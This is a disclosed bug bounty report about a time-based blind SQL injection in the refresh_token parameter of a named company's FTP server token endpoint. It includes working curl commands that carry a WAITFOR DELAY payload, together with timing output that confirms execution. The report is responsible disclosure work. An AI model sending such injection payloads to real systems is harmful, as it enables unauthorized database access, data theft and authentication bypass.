# Blind SQL injection at tsftp.informatica.com

## Report Details
- **Report ID**: 1034625
- **URL**: https://hackerone.com/reports/1034625
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-11-14T17:39:02.567Z
- **Disclosed**: 2020-11-16T10:32:06.952Z

## Reporter
- **Username**: r1pley
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
The parameter `refresh_token` sent to the REST path /api/v1/token is vulnerable to blind SQL injection.

Compare the response time of these 2 requests:

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total
```

vs

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total
```
and notice that the WAITFOR DELAY command is executed.

## Impact

Blind SQL injection can be exploited to exfiltrate data from the FTP server, bypass authentication or for remote code execution.

I stopped my testing at the time-based PoC because I didn't want to risk accessing sensitive data. If you would like to though, I can continue exploiting this vulnerability to present the above impact in practice, eg by getting the database version string.

## Attachments
No attachments
